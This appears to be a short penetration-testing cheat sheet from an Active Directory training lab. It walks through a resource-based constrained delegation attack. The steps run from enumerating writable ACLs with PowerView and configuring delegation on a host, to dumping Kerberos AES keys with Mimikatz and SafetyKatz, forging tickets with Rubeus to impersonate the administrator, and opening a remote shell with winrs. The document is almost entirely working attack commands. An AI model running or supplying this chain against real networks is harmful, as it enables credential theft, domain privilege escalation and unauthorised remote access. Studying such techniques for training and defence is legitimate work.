# RBCD -

### PowerShell

#### Enumerate if we have Write permissions over any object

```
# PowerView
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
```

#### Configure RBCD on us-helpdesk for student machines

```
# AD Module
$comps = 'student1$','student2$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps
```

#### We we can dump the AES Keys of the Students

```
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# SafetyKatz Binary
SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"

# SafetyKatz Old (For Windows 2020 Server)
SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
```

***

### Binaries

#### Rubeus

> Use the AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want

```
Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```

#### Winrs

> Now we can connect to the session

```
winrs -r:us-helpdesk cmd.exe
```
